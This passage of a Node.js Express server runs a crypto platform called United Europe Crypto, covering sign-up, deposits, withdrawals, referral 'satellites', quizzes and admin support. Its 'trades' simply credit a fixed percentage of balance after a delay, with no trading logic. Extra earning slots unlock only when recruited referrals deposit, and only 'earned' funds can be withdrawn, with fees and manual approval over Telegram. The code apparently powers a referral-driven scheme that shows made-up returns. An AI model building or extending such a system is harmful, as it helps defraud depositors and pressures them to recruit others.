    if (reward.group === "balance") {
      progress = balance;
      target = reward.threshold;
      eligible = balance >= reward.threshold;
    } else if (reward.type === "reward_invited_satellite") {
      progress = deposit;
      target = ACTIVE_SATELLITE_MIN_DEPOSIT;
      eligible = Boolean(user.referrer_id) && deposit >= ACTIVE_SATELLITE_MIN_DEPOSIT;
      amount = invitedSatelliteRewardAmount(deposit) || amount;
    } else if (reward.group === "satellites") {
      progress = satellites;
      target = reward.satelliteRank;
      eligible = satellites >= reward.satelliteRank;
    } else if (reward.group === "trade") {
      progress = tradeStreak;
      target = reward.streakDays;
      eligible = tradeStreak >= reward.streakDays;
    }
    return {
      ...reward,
      amount,
      progress,
      target,
      eligible,
      claimed: claimed.has(reward.type)
    };
  });
}

async function settleMatureTrades(userId) {
  const cutoff = new Date(Date.now() - TRADE_SETTLE_MS).toISOString();
  const { data: pending } = await supabase
    .from("signals")
    .select("id,amount")
    .eq("user_id", userId)
    .like("type", "trade_%")
    .eq("status", "pending")
    .lte("created_at", cutoff)
    .order("created_at", { ascending: true });

  for (const trade of pending || []) {
    const { data: updated } = await supabase
      .from("signals")
      .update({ status: "rewarded" })
      .eq("id", trade.id)
      .eq("status", "pending")
      .select("id")
      .maybeSingle();
    if (!updated) continue;
    const user = await findUser(userId, "id,balance");
    if (!user) continue;
    const balance = Number((Number(user.balance || 0) + Number(trade.amount || 0)).toFixed(2));
    await supabase.from("users").update({ balance }).eq("id", user.id);
  }

  if ((pending || []).length) await getTradeStreak(userId);
}

function emailCodeDigest(code) {
  return crypto.createHash("sha256").update(`${code}:${SECRET}`).digest("hex");
}

function encryptForStorage(value) {
  const key = crypto.createHash("sha256").update(SECRET).digest();
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const encrypted = Buffer.concat([cipher.update(String(value), "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `enc:gcm:${iv.toString("base64")}:${tag.toString("base64")}:${encrypted.toString("base64")}`;
}

async function sendVerificationEmail(email, code, purpose = "registration") {
  const action = purpose === "email_change"
    ? "зміни електронної пошти"
    : (purpose === "password_reset" ? "відновлення пароля" : "реєстрації");
  const subject = `Код підтвердження United Europe Crypto: ${code}`;
  const html = `<div style="font-family:Arial,sans-serif;max-width:560px;margin:auto;color:#111"><h2>United Europe Crypto</h2><p>Ваш код для ${action}:</p><div style="font-size:34px;font-weight:700;letter-spacing:8px;margin:24px 0">${code}</div><p>Код дійсний 10 хвилин. Якщо ви не робили цей запит, просто проігноруйте лист.</p></div>`;
  if (BREVO_API_KEY && BREVO_SENDER_EMAIL) {
    await axios.post("https://api.brevo.com/v3/smtp/email", {
      sender: { name: "United Europe Crypto", email: BREVO_SENDER_EMAIL },
      to: [{ email }],
      subject,
      htmlContent: html
    }, {
      headers: { "api-key": BREVO_API_KEY, "Content-Type": "application/json", accept: "application/json" }
    });
    return;
  }
  if (!RESEND_API_KEY) throw new Error("Email provider is not configured");
  await axios.post("https://api.resend.com/emails", {
    from: EMAIL_FROM,
    to: [email],
    subject,
    html
  }, {
    headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" }
  });
}

function registrationData(body) {
  const referrerRaw = String(body.referrer_id || "").trim();
  return {
    fullname: cleanText(body.fullname, 80),
    nickname: cleanText(body.nickname, 40),
    country: cleanText(body.country, 60),
    phone: cleanPhone(body.phone),
    email: cleanEmail(body.email),
    password: String(body.password || "").slice(0, 200),
    referrerProvided: Boolean(referrerRaw),
    referrerId: parseUserId(referrerRaw)
  };
}

async function validateRegistration(data) {
  if (!data.fullname || !data.nickname || !data.country || !data.email || !data.password || !data.phone) return "No data";
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) return "Invalid email";
  if (data.phone.length < 10 || data.phone.length > 15) return "Invalid phone";
  if (data.password.length < 6) return "Weak password";
  if (data.referrerProvided && (!Number.isInteger(data.referrerId) || data.referrerId <= 0 || !(await findUser(data.referrerId, "id")))) return "Invalid referrer";
  const { data: existing } = await supabase.from("users").select("id").eq("email", data.email).maybeSingle();
  return existing ? "User exists" : null;
}

function requestIp(req) {
  return clientIp(req);
}

async function tooManyAccounts(ip) {
  const { count } = await supabase.from("users").select("id", { count: "exact", head: true }).eq("ip", ip);
  return (count || 0) >= 3;
}

async function refreshSatelliteCount(userId) {
  if (!userId) return;
  const { count } = await supabase
    .from("users")
    .select("id", { count: "exact", head: true })
    .eq("referrer_id", userId);
  await supabase.from("users").update({ satellites: count || 0 }).eq("id", userId);
}

async function createRegisteredUser(data, passwordHash, ip, emailVerified = false) {
  const { data: user, error } = await supabase
    .from("users")
    .insert([{
      fullname: data.fullname,
      nickname: data.nickname,
      referrer_id: data.referrerId,
      country: data.country,
      phone: data.phone,
      email: data.email,
      password: passwordHash,
      balance: 0,
      deposit: 0,
      satellites: 0,
      wallet_address: null,
      private_key: null,
      email_code: null,
      email_verified: emailVerified,
      ip
    }])
    .select("id,fullname,nickname,country,phone,email,wallet_address,referrer_id,balance")
    .single();

  if (error || !user) {
    console.error("REGISTER INSERT ERROR:", error);
    return { success: false, message: "Insert error" };
  }

  await addSignal({
    user_id: user.id,
    type: "register",
    amount: 0,
    wallet: user.wallet_address || "wallet_request_required",
    status: "done"
  });
  await refreshSatelliteCount(data.referrerId);

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: [
        "NEW USER",
        `ID: ${formatUserId(user.id)}`,
        `Email: ${user.email}`,
        `Name: ${user.fullname}`,
        `Nickname: ${user.nickname}`,
        `Country: ${user.country}`,
        `Phone: ${user.phone}`,
        `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
        `Deposit asset: ${DEPOSIT_ASSET}`,
        `Deposit network: ${DEPOSIT_NETWORK}`,
        `Deposit wallet: ${DEPOSIT_WALLET_ADDRESS}`,
        "Secret phrase: not sent for security",
        `Email verified: ${emailVerified ? "yes" : "temporarily skipped"}`,
        `Starting balance: $0`
      ].join("\n")
    });
  } catch (telegramError) {
    console.error("TELEGRAM ERROR:", telegramError.message);
  }

  return { success: true, user };
}

app.get("/registration/settings", (req, res) => {
  res.json({ success: true, emailVerificationRequired: EMAIL_VERIFICATION_REQUIRED });
});

app.post("/register/start", registerLimiter, async (req, res) => {
  try {
    const data = registrationData(req.body);
    const validationError = await validateRegistration(data);
    if (validationError) return res.json({ success: false, message: validationError });
    const ip = requestIp(req);
    if (await tooManyAccounts(ip)) return res.json({ success: false, message: "Too many accounts" });

    const passwordHash = await bcrypt.hash(data.password, 10);
    if (!EMAIL_VERIFICATION_REQUIRED) {
      const created = await createRegisteredUser(data, passwordHash, ip, false);
      if (!created.success) return res.json(created);
      return res.json({ success: true, registered: true });
    }

    const code = crypto.randomInt(100000, 1000000).toString();
    const pendingToken = jwt.sign({
      purpose: "registration",
      profile: { ...data, password: undefined },
      passwordHash,
      codeDigest: emailCodeDigest(code),
      ip
    }, SECRET, { expiresIn: "10m" });
    await sendVerificationEmail(data.email, code);
    return res.json({ success: true, pendingToken, email: data.email });
  } catch (error) {
    console.error("REGISTER START ERROR:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Email send error" });
  }
});

app.post("/register/verify", registerLimiter, async (req, res) => {
  try {
    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
    const code = String(req.body.code || "").trim();
    if (pending.purpose !== "registration" || emailCodeDigest(code) !== pending.codeDigest) {
      return res.json({ success: false, message: "Invalid code" });
    }
    const data = { ...pending.profile, password: "verified" };
    const validationError = await validateRegistration(data);
    if (validationError) return res.json({ success: false, message: validationError });
    if (await tooManyAccounts(pending.ip)) return res.json({ success: false, message: "Too many accounts" });

    const created = await createRegisteredUser(data, pending.passwordHash, pending.ip, true);
    if (!created.success) return res.json(created);
    return res.json({ success: true });
  } catch (error) {
    console.error("REGISTER VERIFY ERROR:", error);
    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
  }
});

app.post("/login", authLimiter, async (req, res) => {
  try {
    const email = cleanEmail(req.body.email);
    const password = String(req.body.password || "").slice(0, 200);
    if (!email || !password) return res.json({ success: false });

    const { data: user } = await supabase.from("users").select("id,password").eq("email", email).maybeSingle();
    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.json({ success: false });
    }
    return res.json({ success: true, token: jwt.sign({ id: user.id }, SECRET) });
  } catch (error) {
    console.error("LOGIN ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/password/reset/start", authLimiter, async (req, res) => {
  try {
    const email = cleanEmail(req.body.email);
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.json({ success: false, message: "Invalid email" });
    }
    const { data: user, error } = await supabase
      .from("users")
      .select("id,email")
      .eq("email", email)
      .maybeSingle();
    if (error) throw error;
    if (!user) return res.json({ success: true, email });

    const code = crypto.randomInt(100000, 1000000).toString();
    const pendingToken = jwt.sign({
      purpose: "password_reset",
      userId: user.id,
      email: user.email,
      codeDigest: emailCodeDigest(code)
    }, SECRET, { expiresIn: "10m" });
    await sendVerificationEmail(user.email, code, "password_reset");
    return res.json({ success: true, pendingToken, email: user.email });
  } catch (error) {
    console.error("PASSWORD RESET START ERROR:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Email send error" });
  }
});

app.post("/password/reset/verify", authLimiter, async (req, res) => {
  try {
    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
    const code = String(req.body.code || "").trim();
    const password = String(req.body.password || "").slice(0, 200);
    if (pending.purpose !== "password_reset" || emailCodeDigest(code) !== pending.codeDigest) {
      return res.json({ success: false, message: "Invalid code" });
    }
    if (password.length < 6) return res.json({ success: false, message: "Weak password" });
    const { data: user, error: userError } = await supabase
      .from("users")
      .select("id,email")
      .eq("id", pending.userId)
      .eq("email", cleanEmail(pending.email))
      .maybeSingle();
    if (userError) throw userError;
    if (!user) return res.json({ success: false, message: "Invalid code" });

    const passwordHash = await bcrypt.hash(password, 10);
    const { error } = await supabase.from("users").update({ password: passwordHash }).eq("id", user.id);
    if (error) throw error;
    return res.json({ success: true });
  } catch (error) {
    console.error("PASSWORD RESET VERIFY ERROR:", error);
    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
  }
});

app.get("/me", auth, async (req, res) => {
  const user = await findUser(req.userId);
  if (!user) return res.status(404).json({ success: false });
  const pendingWalletRequests = await pendingWalletCreateRequests(req.userId);
  return res.json({
    ...withDisplayId(user),
    wallet_address: personalWalletAddress(user),
    wallet_request_pending: Boolean((pendingWalletRequests || []).length),
    deposit_asset: DEPOSIT_ASSET,
    deposit_network: DEPOSIT_NETWORK,
    deposit_wallet_address: personalWalletAddress(user)
  });
});

app.get("/deposit/config", auth, async (req, res) => {
  const user = await findUser(req.userId, "id,fullname,nickname,email,phone,wallet_address");
  const wallet = personalWalletAddress(user);
  let pendingWalletRequests = await pendingWalletCreateRequests(req.userId);
  let walletRequestCreated = false;
  if (!wallet && String(req.query.request_wallet || "") === "1") {
    const requestResult = await ensureWalletCreateRequest(user, true);
    walletRequestCreated = requestResult.created;
    pendingWalletRequests = requestResult.pending ? [{ id: "wallet_request" }] : [];
  }
  return res.json({
    success: true,
    asset: DEPOSIT_ASSET,
    network: DEPOSIT_NETWORK,
    wallet_address: wallet,
    wallet_missing: !wallet,
    wallet_request_pending: Boolean((pendingWalletRequests || []).length),
    wallet_request_created: walletRequestCreated,
    memo_required: false
  });
});

app.post("/wallet/request", auth, async (req, res) => {
  try {
    const user = await findUser(req.userId, "id,fullname,nickname,email,phone,wallet_address");
    if (!user) return res.status(404).json({ success: false });
    const pending = await pendingWalletCreateRequests(user.id);
    if (pending.length) {
      await notifyWalletCreateRequest(user, "already pending");
      return res.json({ success: true, message: "Wallet request is already pending", wallet_assigned: Boolean(personalWalletAddress(user)) });
    }
    await ensureWalletCreateRequest(user);
    return res.json({
      success: true,
      message: "Wallet request created",
      wallet_assigned: false
    });
  } catch (error) {
    console.error("WALLET REQUEST ERROR:", error);
    return res.status(500).json({ success: false, message: "Wallet request error" });
  }
});

app.post("/profile/change-request", actionLimiter, auth, async (req, res) => {
  try {
    const changes = {
      fullname: cleanText(req.body.fullname, 80),
      nickname: cleanText(req.body.nickname, 40),
      country: cleanText(req.body.country, 60),
      phone: cleanPhone(req.body.phone)
    };
    if (!changes.fullname || !changes.nickname || !changes.country || changes.phone.length < 10 || changes.phone.length > 15) {
      return res.json({ success: false, message: "Invalid data" });
    }
    await addSignal({ user_id: req.userId, type: "profile_update", amount: 0, wallet: JSON.stringify(changes), status: "pending" });
    return res.json({ success: true, message: "Request created" });
  } catch (error) {
    console.error("PROFILE REQUEST ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/profile/email/start", authLimiter, auth, async (req, res) => {
  try {
    const email = cleanEmail(req.body.email);
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.json({ success: false, message: "Invalid email" });
    const { data: existing } = await supabase.from("users").select("id").eq("email", email).maybeSingle();
    if (existing) return res.json({ success: false, message: "User exists" });
    const code = crypto.randomInt(100000, 1000000).toString();
    const pendingToken = jwt.sign({ purpose: "email_change", userId: req.userId, email, codeDigest: emailCodeDigest(code) }, SECRET, { expiresIn: "10m" });
    await sendVerificationEmail(email, code, "email_change");
    return res.json({ success: true, pendingToken });
  } catch (error) {
    console.error("EMAIL CHANGE START ERROR:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Email send error" });
  }
});

app.post("/profile/email/verify", authLimiter, auth, async (req, res) => {
  try {
    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
    const code = String(req.body.code || "").trim();
    if (pending.purpose !== "email_change" || Number(pending.userId) !== Number(req.userId) || emailCodeDigest(code) !== pending.codeDigest) {
      return res.json({ success: false, message: "Invalid code" });
    }
    const { data: existing } = await supabase.from("users").select("id").eq("email", pending.email).maybeSingle();
    if (existing) return res.json({ success: false, message: "User exists" });
    await addSignal({ user_id: req.userId, type: "email_update", amount: 0, wallet: JSON.stringify({ email: pending.email }), status: "pending" });
    return res.json({ success: true, message: "Request created" });
  } catch (error) {
    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
  }
});

app.get("/health", (req, res) => res.json({ success: true }));

app.get("/support/history", auth, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from("signals")
      .select("id,type,wallet,status,created_at")
      .eq("user_id", req.userId)
      .in("type", ["support_user", "support_bot", "support_admin"])
      .order("created_at", { ascending: true })
      .limit(120);
    if (error) throw error;
    return res.json({
      success: true,
      messages: (data || []).map(item => ({
        id: item.id,
        type: item.type,
        status: item.status,
        created_at: item.created_at,
        ...parseSupportPayload(item.wallet)
      }))
    });
  } catch (error) {
    console.error("SUPPORT HISTORY ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/support/chat", actionLimiter, auth, async (req, res) => {
  try {
    const message = cleanText(req.body.message, 1800);
    if (!message || message.length < 2) return res.json({ success: false, message: "Empty message" });
    const user = await findUser(req.userId, "id,fullname,nickname,email");
    if (!user) return res.status(404).json({ success: false });

    const result = supportAnswer(message);
    await addSignal({
      user_id: req.userId,
      type: "support_user",
      amount: 0,
      wallet: supportPayload("user", message),
      status: result.handled ? "answered" : "pending"
    });
    await addSignal({
      user_id: req.userId,
      type: "support_bot",
      amount: 0,
      wallet: supportPayload("bot", result.text),
      status: result.handled ? "answered" : "pending"
    });
    if (!result.handled) {
      await sendTelegramMessage(formatSupportTelegram(user, message), [SUPPORT_TELEGRAM_TOKEN]);
    }
    return res.json({ success: true, reply: result.text, escalated: !result.handled });
  } catch (error) {
    console.error("SUPPORT CHAT ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/assets/summary", auth, async (req, res) => {
  try {
    await settleMatureTrades(req.userId);
    const user = await findUser(req.userId, "id,balance,deposit");
    if (!user) return res.status(404).json({ success: false });

    const { data, error } = await supabase
      .from("signals")
      .select("id,type,amount,wallet,status,created_at")
      .eq("user_id", req.userId)
      .order("created_at", { ascending: false });
    if (error) throw error;

    const history = (data || []).filter(signal =>
      signal.type === "deposit" ||
      signal.type === "withdraw" ||
      signal.type.startsWith("quiz_") ||
      signal.type.startsWith("trade_") ||
      (signal.type.startsWith("reward_") && signal.type !== "reward_balance_500")
    );
    const tradingEarned = history
      .filter(signal => signal.type.startsWith("trade_") && signal.status === "rewarded")
      .reduce((sum, signal) => sum + Number(signal.amount || 0), 0);
    const taskEarned = history
      .filter(signal => (signal.type.startsWith("quiz_") || signal.type.startsWith("reward_")) && ["rewarded", "approved"].includes(signal.status))
      .reduce((sum, signal) => sum + Number(signal.amount || 0), 0);

    return res.json({
      success: true,
      balance: Number(user.balance || 0),
      deposit: Number(user.deposit || 0),
      tradingEarned: Number(tradingEarned.toFixed(2)),
      taskEarned: Number(taskEarned.toFixed(2)),
      history,
      pool: getPoolSnapshot()
    });
  } catch (error) {
    console.error("ASSETS ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/rewards/status", auth, async (req, res) => {
  try {
    const rewards = await rewardProgress(req.userId);
    if (!rewards) return res.status(404).json({ success: false });
    return res.json({ success: true, rewards });
  } catch (error) {
    console.error("REWARDS STATUS ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/rewards/claim", actionLimiter, auth, async (req, res) => {
  try {
    const type = String(req.body.type || "");
    const rewards = await rewardProgress(req.userId);
    const reward = (rewards || []).find(item => item.type === type);
    if (!reward) return res.json({ success: false, message: "Reward unavailable" });
    if (reward.claimed) return res.json({ success: false, message: "Reward already claimed" });
    if (!reward.eligible) return res.json({ success: false, message: "Reward goal is not completed" });
    const granted = await grantRewardOnce(req.userId, reward.type, reward.amount, `reward:${reward.type}`);
    if (!granted) return res.json({ success: false, message: "Reward already claimed" });
    const user = await findUser(req.userId, "id,balance");
    return res.json({ success: true, amount: reward.amount, balance: Number(user?.balance || 0) });
  } catch (error) {
    console.error("REWARDS CLAIM ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/deposit", actionLimiter, auth, async (req, res) => {
  try {
    const amount = positiveAmount(req.body.amount);
    if (!amount || amount < MIN_DEPOSIT_AMOUNT) {
      return res.json({ success: false, message: `Minimum deposit is $${MIN_DEPOSIT_AMOUNT}` });
    }
    const user = await findUser(req.userId, "id,fullname,nickname,email,phone,balance,deposit,wallet_address");
    if (!user) return res.status(404).json({ success: false });
    const wallet = personalWalletAddress(user);
    if (!wallet) {
      return res.json({ success: false, message: "Personal wallet is not created yet" });
    }
    const { count, error: countError } = await supabase
      .from("signals")
      .select("id", { count: "exact", head: true })
      .eq("user_id", user.id)
      .eq("type", "deposit")
      .eq("status", "approved");
    if (countError) throw countError;
    if ((count || 0) >= MAX_DEPOSIT_REQUESTS) {
      return res.json({ success: false, message: "Deposit limit reached" });
    }

    await addSignal({ user_id: user.id, type: "deposit", amount, wallet, status: "pending" });
    await sendTelegramMessage(requestTelegramText("deposit", user, amount, wallet), [TELEGRAM_MIRROR_TOKEN]);
    return res.json({ success: true, message: "Signal created" });
  } catch (error) {
    console.error("DEPOSIT ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/withdraw/config", auth, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from("signals")
      .select("wallet")
      .eq("user_id", req.userId)
      .eq("type", "withdraw_wallet")
      .eq("status", "saved")
      .order("created_at", { ascending: false })
      .limit(1);
    if (error) throw error;
    return res.json({ success: true, wallet: cleanWallet(data?.[0]?.wallet) });
  } catch (error) {
    console.error("WITHDRAW CONFIG ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/withdraw/wallet", actionLimiter, auth, async (req, res) => {
  try {
    const wallet = cleanWallet(req.body.wallet);
    if (!isValidWallet(wallet)) return res.json({ success: false, message: "Invalid wallet" });
    await addSignal({ user_id: req.userId, type: "withdraw_wallet", amount: 0, wallet, status: "saved" });
    return res.json({ success: true, wallet });
  } catch (error) {
    console.error("WITHDRAW WALLET SAVE ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/withdraw", actionLimiter, auth, async (req, res) => {
  try {
    const amount = positiveAmount(req.body.amount);
    const wallet = cleanWallet(req.body.wallet);
    const user = await findUser(req.userId, "id,fullname,nickname,email,phone,balance,deposit");
    if (!user || !isValidWallet(wallet) || !amount) {
      return res.json({ success: false, message: "Invalid withdrawal" });
    }
    if (amount < MIN_WITHDRAW_AMOUNT) {
      return res.json({ success: false, message: `Minimum withdrawal is $${MIN_WITHDRAW_AMOUNT}` });
    }
    const since = new Date(Date.now() - WITHDRAW_COOLDOWN_MS).toISOString();
    const { count: recentCount, error: recentError } = await supabase
      .from("signals")
      .select("id", { count: "exact", head: true })
      .eq("user_id", user.id)
      .eq("type", "withdraw")
      .gte("created_at", since)
      .eq("status", "approved");
    if (recentError) throw recentError;
    if ((recentCount || 0) > 0) return res.json({ success: false, message: "Withdrawal is available once per hour" });

    const { data: pendingWithdraws, error: pendingError } = await supabase
      .from("signals")
      .select("amount,wallet")
      .eq("user_id", user.id)
      .eq("type", "withdraw")
      .eq("status", "pending");
    if (pendingError) throw pendingError;
    const pendingAmount = (pendingWithdraws || []).reduce((sum, signal) => sum + withdrawalGrossAmount(signal), 0);
    const earnedAvailable = Number((Number(user.balance || 0) - Number(user.deposit || 0) - pendingAmount).toFixed(2));
    if (amount > earnedAvailable) {
      return res.json({ success: false, message: "Only earned funds are available for withdrawal" });
    }

    const feeAmount = withdrawalFeeAmount(amount);
    const netAmount = withdrawalNetAmount(amount);
    const details = withdrawalPayload(wallet, amount);
    await addSignal({ user_id: user.id, type: "withdraw", amount: netAmount, wallet: details, status: "pending" });
    await addSignal({ user_id: user.id, type: "withdraw_wallet", amount: 0, wallet, status: "saved" });
    await sendTelegramMessage(requestTelegramText("withdraw", user, netAmount, details), [TELEGRAM_MIRROR_TOKEN]);
    return res.json({ success: true, message: "Signal created", gross_amount: amount, fee_amount: feeAmount, net_amount: netAmount });
  } catch (error) {
    console.error("WITHDRAW ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/referrals", auth, async (req, res) => {
  const { data, error } = await supabase
    .from("users")
    .select("id,nickname,country,balance,deposit")
    .eq("referrer_id", req.userId)
    .order("id", { ascending: true });
  if (error) return res.status(500).json({ success: false });
  return res.json((data || []).map(user => ({
    ...withDisplayId(user),
    active: Number(user.deposit || 0) >= ACTIVE_SATELLITE_MIN_DEPOSIT
  })));
});

app.get("/quiz/progress", auth, async (req, res) => {
  const user = await findUser(req.userId, "id,deposit");
  if (!user) return res.status(404).json({ success: false });
  const learningUnlocked = Number(user.deposit || 0) >= LEARNING_MIN_DEPOSIT;
  const { data } = await supabase
    .from("signals")
    .select("type")
    .eq("user_id", req.userId)
    .like("type", "quiz_%")
    .eq("status", "rewarded");
  const completed = (data || []).map(item => Number(item.type.replace("quiz_", ""))).filter(Boolean);
  return res.json({ success: true, completed, learningUnlocked, minDeposit: LEARNING_MIN_DEPOSIT, deposit: Number(user.deposit || 0) });
});

app.post("/quiz/complete", actionLimiter, auth, async (req, res) => {
  try {
    const user = await findUser(req.userId, "id,balance,deposit");
    if (!user) return res.status(404).json({ success: false });
    if (Number(user.deposit || 0) < LEARNING_MIN_DEPOSIT) {
      return res.json({ success: false, message: "Learning locked", minDeposit: LEARNING_MIN_DEPOSIT });
    }

    const quizId = Number(req.body.quizId);
    const answer = String(req.body.answer || "").toLowerCase();
    if (!QUIZ_ANSWERS[quizId] || QUIZ_ANSWERS[quizId] !== answer) {
      return res.json({ success: false, message: "Incorrect answer" });
    }

    const type = `quiz_${quizId}`;
    const { data: existing } = await supabase
      .from("signals")
      .select("id")
      .eq("user_id", req.userId)
      .eq("type", type)
      .eq("status", "rewarded")
      .limit(1)
      .maybeSingle();
    if (existing) return res.json({ success: false, message: "Already completed" });

    const newBalance = Number((Number(user.balance || 0) + QUIZ_REWARD_AMOUNT).toFixed(2));
    const { error } = await supabase.from("users").update({ balance: newBalance }).eq("id", req.userId);
    if (error) throw error;
    await addSignal({ user_id: req.userId, type, amount: QUIZ_REWARD_AMOUNT, wallet: `quiz:${quizId}`, status: "rewarded" });
    return res.json({ success: true, reward: QUIZ_REWARD_AMOUNT, balance: newBalance });
  } catch (error) {
    console.error("QUIZ ERROR:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

async function tradeStatus(userId) {
  await settleMatureTrades(userId);
  const user = await findUser(userId, "id,balance");
  if (!user) return null;

  const { data: referralRows } = await supabase
    .from("users")
    .select("id,nickname,country,balance,deposit")
    .eq("referrer_id", userId)
    .order("id", { ascending: true })
    .limit(5);
  const referrals = (referralRows || []).map(user => ({
    ...withDisplayId(user),
    active: Number(user.deposit || 0) >= ACTIVE_SATELLITE_MIN_DEPOSIT
  }));
  const { data: trades } = await supabase
    .from("signals")
    .select("type,created_at,status")
    .eq("user_id", userId)
    .like("type", "trade_%")
    .order("created_at", { ascending: false });

  const lastByType = {};
  const pendingByType = {};
  for (const trade of trades || []) {
    if (!lastByType[trade.type]) lastByType[trade.type] = new Date(trade.created_at).getTime();
    if (trade.status === "pending" && !pendingByType[trade.type]) {
      pendingByType[trade.type] = Math.max(0, TRADE_SETTLE_MS - (Date.now() - new Date(trade.created_at).getTime()));
    }
  }
  const now = Date.now();
  const today = dayKey(new Date(now));
  const cooldown = type => {
    const last = lastByType[type] || 0;
    if (!last || dayKey(new Date(last)) !== today) return 0;
    return Math.max(0, nextMidnightKyivMs(now) - now);
  };

  return {
    balance: Number(user.balance || 0),
    main: { unlocked: true, cooldown: cooldown("trade_main"), pending: pendingByType.trade_main || 0, rate: TRADE_RATES[0] },
    slots: Array.from({ length: 5 }, (_, index) => {
      const satellite = referrals?.[index] || null;
      const type = `trade_satellite_${index + 1}`;
      return {
        position: index + 1,
        unlocked: Boolean(satellite?.active),
        cooldown: cooldown(type),
        pending: pendingByType[type] || 0,
        rate: TRADE_RATES[index + 1],
        satellite,
        minDeposit: ACTIVE_SATELLITE_MIN_DEPOSIT
      };
    })
  };
}

app.get("/trade/status", auth, async (req, res) => {
  const status = await tradeStatus(req.userId);
  if (!status) return res.status(404).json({ success: false });
  return res.json({ success: true, ...status });
});

app.post("/trade/execute", actionLimiter, auth, async (req, res) => {
  try {
    const position = Number(req.body.position);
    if (!Number.isInteger(position) || position < 0 || position > 5) {
      return res.json({ success: false, message: "Invalid position" });
    }
    const status = await tradeStatus(req.userId);
    if (!status || status.balance <= 0) return res.json({ success: false, message: "No balance" });

    const option = position === 0 ? status.main : status.slots[position - 1];
    if (!option.unlocked) return res.json({ success: false, message: "Position locked" });
    if (option.pending > 0) return res.json({ success: false, message: "Trade pending", pending: option.pending });
    if (option.cooldown > 0) return res.json({ success: false, message: "Cooldown active", cooldown: option.cooldown });

    const type = position === 0 ? "trade_main" : `trade_satellite_${position}`;
    const satellite = position === 0 ? null : option.satellite;
    const reward = Number((status.balance * option.rate).toFixed(2));
    await addSignal({
      user_id: req.userId,
      type,
      amount: reward,
      wallet: satellite ? String(satellite.id) : "main",
      status: "pending"
    });
    return res.json({ success: true, pending: true, reward, balance: status.balance, completesIn: TRADE_SETTLE_MS });
  } catch (error) {
    console.error("TRADE ERROR:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

app.get("/admin/users", adminLimiter, adminAuth, async (req, res) => {
  const { data, error } = await supabase.from("users").select(PUBLIC_USER_FIELDS).order("id", { ascending: true });
  if (error) return res.status(500).json({ success: false, message: error.message });
  const counts = {};
  for (const user of data || []) {
    if (user.referrer_id) counts[user.referrer_id] = (counts[user.referrer_id] || 0) + 1;
  }
  return res.json((data || []).map(user => ({ ...withDisplayId(user), satellites: counts[user.id] || 0 })));
});

app.get("/admin/signals", adminLimiter, adminAuth, async (req, res) => {
  const [{ data: signals }, { data: users }] = await Promise.all([
    supabase.from("signals").select("id,user_id,type,amount,wallet,status,created_at").order("created_at", { ascending: false }),
    supabase.from("users").select("id,fullname,nickname,email")
  ]);
  const usersById = Object.fromEntries((users || []).map(user => [user.id, withDisplayId(user)]));
  return res.json((signals || []).map(signal => ({ ...signal, user: usersById[signal.user_id] || null })));
});

app.get("/admin/support", adminLimiter, adminAuth, async (req, res) => {
  const [{ data: messages, error }, { data: users }] = await Promise.all([
    supabase
      .from("signals")
      .select("id,user_id,type,wallet,status,created_at")
      .in("type", ["support_user", "support_bot", "support_admin"])
      .order("created_at", { ascending: true }),
    supabase.from("users").select("id,fullname,nickname,email")
  ]);
  if (error) return res.status(500).json({ success: false, message: error.message });
  const usersById = Object.fromEntries((users || []).map(user => [user.id, withDisplayId(user)]));
  return res.json({
    success: true,
    messages: (messages || []).map(item => ({
      id: item.id,
      user_id: item.user_id,
      type: item.type,
      status: item.status,
      created_at: item.created_at,
      user: usersById[item.user_id] || null,
      ...parseSupportPayload(item.wallet)
    }))
  });
});

app.post("/admin/support/reply", adminLimiter, adminAuth, async (req, res) => {
  try {
    const userId = Number(req.body.user_id);
    const message = cleanText(req.body.message, 1800);
    if (!Number.isInteger(userId) || userId <= 0 || !message) return res.json({ success: false, message: "Invalid reply" });
    const user = await findUser(userId, "id");
    if (!user) return res.json({ success: false, message: "User not found" });
    await addSignal({
      user_id: userId,
      type: "support_admin",
      amount: 0,
      wallet: supportPayload("support", message),
      status: "answered"
    });
    await supabase
      .from("signals")
      .update({ status: "answered" })
      .eq("user_id", userId)
      .in("type", ["support_user", "support_bot"])
      .eq("status", "pending");
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN SUPPORT REPLY ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

